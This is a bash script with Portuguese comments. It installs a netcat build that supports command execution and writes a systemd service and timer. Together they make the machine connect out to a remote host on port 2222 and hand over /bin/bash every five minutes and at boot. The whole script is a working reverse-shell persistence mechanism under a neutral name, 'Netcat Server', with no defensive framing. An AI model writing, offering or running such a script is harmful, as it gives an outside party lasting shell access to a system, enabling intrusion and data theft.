#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

sudo apt remove netcat-openbsd -y

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi

# Criar arquivo de serviço
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=bash -c 'if ! pgrep -x "nc" >/dev/null; then nc $IP_SERVER 2222 -e /bin/bash; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE"

echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_TIMER"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask nc.service
sudo systemctl start nc.service
sudo systemctl enable nc.service
sudo systemctl unmask nc.timer
sudo systemctl start nc.timer
sudo systemctl enable nc.timer

echo "Configuração do serviço Netcat concluída."